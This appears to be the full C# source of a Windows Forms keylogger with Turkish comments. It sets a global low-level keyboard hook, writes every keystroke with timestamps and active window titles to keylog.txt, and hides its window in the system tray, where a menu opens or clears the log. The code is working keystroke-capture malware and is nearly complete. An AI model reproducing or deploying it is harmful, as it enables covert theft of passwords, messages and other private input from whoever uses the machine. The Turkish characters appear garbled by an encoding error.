namespace KeyloggerForm
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    public partial class Form1 : Form
    {
        private static string logPath = Path.Combine(
        AppDomain.CurrentDomain.BaseDirectory, "keylog.txt"
    );

        private NotifyIcon trayIcon = new NotifyIcon();
        private ContextMenuStrip trayMenu = new ContextMenuStrip();

        private void OnExit(object sender, EventArgs e)
        {
            trayIcon.Visible = false;
            Application.Exit();
        }
        private void OnOpenLog(object? sender, EventArgs e)
        {
            string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keylog.txt");

            if (File.Exists(logPath))
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
                {
                    FileName = logPath,
                    UseShellExecute = true,
                });
            }
            else
            {
                MessageBox.Show("Log dosyasý bulunamadý.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void OnClearLog(object sender, EventArgs e)
        {
            if (File.Exists(logPath))
            {
                File.WriteAllText(logPath, ""); //dosya sýfýrla
                MessageBox.Show("Log dosyasý temizlendi. ", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);

            }
            else
            {
                MessageBox.Show("Log dosyasý bulunamadý.", "Uyarý", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc proc = HookCallback;

        private static IntPtr hookID = IntPtr.Zero;
        
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(hookID);
            base.OnFormClosed(e);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            var currentProcess = System.Diagnostics.Process.GetCurrentProcess();
            var currentModule = currentProcess.MainModule;

            if (currentModule != null)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
            }
            else
            {
                throw new Exception("MainModule alýnamadý.");
            }
        }
        // Yardýmcý fonksiyon: gerçek karakteri döndürür
        private static string GetCharFromKey(Keys key, int vkCode)
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            // CapsLock ve Shift durumunu kontrol et
            bool capsLock = (GetKeyState(0x14) & 0x0001) != 0; // 0x14 = CapsLock
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;    // 0x10 = Shift

            uint virtualKey = (uint)key;
            uint scanCode = 0;
            StringBuilder sb = new StringBuilder(2);

            IntPtr layout = GetKeyboardLayout(0);

            int result = ToUnicodeEx(virtualKey, scanCode, keyboardState, sb, sb.Capacity, 0, layout);

            if (result > 0)
            {
                string ch = sb.ToString();

                // Eðer harfse, CapsLock ve Shift durumuna göre büyüt/küçült
                if (char.IsLetter(ch[0]))
                {
                    if (capsLock ^ shift) // XOR: biri açýk, diðeri kapalýysa büyük
                        ch = ch.ToUpper();
                    else
                        ch = ch.ToLower();
                }

                return ch;
            }
            else
            {
                // Özel tuþlar
                switch (key)
                {
                    case Keys.Enter: return "[ENTER]";
                    case Keys.Space: return " ";
                    case Keys.Back: return "[BACKSPACE]";
                    case Keys.Tab: return "[TAB]";
                    default: return "";
                }
            }
        }




        // Logu bellekte tutmak için bir StringBuilder
        private static StringBuilder currentLine = new StringBuilder();

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                switch (key)
                {
                    case Keys.Enter:
                        // Satýrý dosyaya yaz ve tarih–saat ekle
                        
                        File.AppendAllText(logPath,  Environment.NewLine);
                        string windowTitle = GetActiveWindowTitle();
                        File.AppendAllText(logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ({windowTitle}) ");
                        currentLine.Clear();
                        break;

                    case Keys.Space:
                        currentLine.Append(" ");
                        File.AppendAllText(logPath, " "); // ?? boþluðu dosyaya da yaz


                        break;

                    case Keys.Back:
                        if (currentLine.Length > 0)
                            currentLine.Remove(currentLine.Length - 1, 1);
                        File.AppendAllText(logPath, "[BACKSPACE]");
                        break;

                    case Keys.Tab:
                        currentLine.Append("\t");
                        File.AppendAllText(logPath, "[TAB]");

                        break;

                    default:
                        //// Önce normal karakteri al
                        string karakter = GetCharFromKey(key, vkCode);

                        //Eðer boþ döndüyse Türkçe eþlemeyi den
                        if (string.IsNullOrEmpty(karakter))
                        {
                            karakter = GetTurkishChar(vkCode);
                        }

                        currentLine.Append(karakter);

                        File.AppendAllText(logPath, karakter);

                        break;
                }
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }
        // Türkçe karakter eþlemeleri
        private static string GetTurkishChar(int vkCode)
        {
            switch (vkCode)
            {
                case 0xDB: return "Ð"; // Örnek: Türkçe Q klavye için
                case 0xDC: return "Ü";
                case 0xBA: return "Þ";
                case 0xC0: return "Ý";
                case 0xDE: return "Ç";
                case 0xBF: return "Ö";

                case 0xE2: return "ð";
                case 0xDD: return "ü";
                case 0xBC: return "þ";
                case 0xA0: return "ý";
                case 0xBE: return "ç";
                case 0x9F: return "ö";

                default: return "";


            }
        }
        // Gerekli DLL importlarý
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
                return Buff.ToString();
            return "Unknown Window";
        }
        // user32.dll fonksiyonlarý
        [DllImport("user32.dll")]
        public static extern int ToUnicodeEx(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags,
            IntPtr dwhkl);

        [DllImport("user32.dll")]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        // kernel32.dll fonksiyonlarý
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            hookID = SetHook(proc);

            //formu gizle
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();


            //tepsi menu oluþtur
            trayMenu = new ContextMenuStrip();
            trayMenu.Items.Add("Log dosyasýný aç", null, OnOpenLog);
            trayMenu.Items.Add("Log'u temizle", null, OnClearLog);
            trayMenu.Items.Add("Çýkýþ", null, OnExit);
            
            

            //notifyIcon oluþtur
            trayIcon = new NotifyIcon();
            trayIcon.Text = "Keylogger Aktif";
            trayIcon.Icon = SystemIcons.Application;
            trayIcon. ContextMenuStrip = trayMenu; //baðlama burada!
            trayIcon.Visible = true;



        }
    }
}
